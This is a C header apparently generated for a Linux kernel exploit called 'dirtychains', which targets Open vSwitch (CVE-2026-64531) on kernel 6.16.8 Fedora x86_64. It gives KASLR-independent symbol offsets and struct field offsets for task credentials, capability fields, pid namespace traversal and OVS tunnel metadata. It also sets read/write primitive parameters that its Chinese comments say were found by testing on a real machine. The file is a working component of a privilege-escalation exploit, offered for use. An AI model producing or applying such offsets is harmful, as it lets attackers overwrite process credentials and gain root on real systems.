/*
 * target.h - dirtychains OVS (CVE-2026-64531) kernel offsets
 *
 * 放这里：offset/<N>系/<release>/target.h
 * 例：    offset/5系/5.8.0-59-generic/target.h
 *
 * 程序启动时按目录名找本机 release，不需要重新编译。
 * 本文件同时也是合法 C 头文件，可以直接 #include 静态编译。
 *
 * 生成: tools/mk_offset.py（记录集）
 */
#ifndef DIRTYCHAINS_TARGET_H
#define DIRTYCHAINS_TARGET_H

#define KREC_FORMAT        1
#define KREC_RELEASE       "6.16.8-200.fc42.x86_64"
#define KREC_VERSION       ""
#define KREC_VERSION_HASH  3314893520UL
#define KREC_MACHINE       "x86_64"

/* 符号偏移：相对 _text，与 KASLR 无关 */
#define KREC_VMLINUX_MODULE_KTYPE 23343968UL
#define KREC_VMLINUX_INIT_PID_NS  42416736UL

/* 结构体字段偏移 */
#define KREC_NF_CONNTRACK_HELPER_ME    40
#define KREC_MODULE_KOBJ_KTYPE         120
#define KREC_TASK_PID                  2768
#define KREC_TASK_CRED                 3296
#define KREC_TASK_PID_LINKS            2880
#define KREC_CRED_FSUID                32
#define KREC_CRED_FSGID                36
#define KREC_CRED_CAP_PERMITTED        56
#define KREC_CRED_CAP_EFFECTIVE        64
#define KREC_PID_NAMESPACE_IDR         0
#define KREC_IDR_IDR_RT                0
#define KREC_IDR_BASE                  16
#define KREC_XARRAY_XA_HEAD            8
#define KREC_XA_NODE_SHIFT             0
#define KREC_XA_NODE_SLOTS             40
#define KREC_PID_TASKS                 56
#define KREC_HLIST_HEAD_FIRST          0
#define KREC_DST_ENTRY_REF             64
#define KREC_METADATA_DST_TUN_INFO     144
#define KREC_IP_TUNNEL_KEY_IPV4_SRC    8
#define KREC_IP_TUNNEL_KEY_IPV4_DST    12
#define KREC_IP_TUNNEL_KEY_TOS         56
#define KREC_IP_TUNNEL_KEY_TTL         57
#define KREC_IP_TUNNEL_KEY_TP_SRC      58
#define KREC_IP_TUNNEL_KEY_TP_DST      60
#define KREC_OVS_CT_LABELS             40
#define KREC_OVS_CT_ACTION_LEN         164

/* 行为参数：从调试信息推不出来，只能实机试 */
#define KREC_REF_KIND      "__rcuref"
#define KREC_TUNNEL_INFO   31
#define KREC_READ_CARRIER  "timeout"
#define KREC_WRITE_CARRIER "timeout"
#define KREC_READ_LANES    "tos,ttl,tp_src_0,tp_src_1,tp_dst_0,tp_dst_1,ipv4_src_0,ipv4_src_1,ipv4_src_2,ipv4_src_3,ipv4_dst_0,ipv4_dst_1,ipv4_dst_2,ipv4_dst_3"

#endif /* DIRTYCHAINS_TARGET_H */
